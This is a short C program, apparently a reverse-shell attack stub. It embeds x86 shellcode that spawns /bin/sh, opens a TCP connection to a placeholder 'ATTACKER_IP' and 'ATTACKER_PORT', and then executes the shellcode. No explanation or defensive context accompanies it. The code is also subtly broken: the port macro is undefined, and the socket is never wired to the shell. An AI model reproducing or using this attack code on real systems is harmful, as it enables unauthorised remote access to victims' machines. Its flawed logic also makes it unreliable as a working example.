#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

unsigned char shellcode[] =
"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
"\x53\x89\xe1\xb0\x0b\xcd\x80";

int main() {
    int sockfd;
    struct sockaddr_in server;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("ATTACKER_IP");
    server.sin_port = htons(ATTACKER_PORT);

    connect(sockfd, (struct sockaddr *)&server, sizeof(server));

    int (*ret)() = (int(*)())shellcode;
    ret();

    return 0;
}
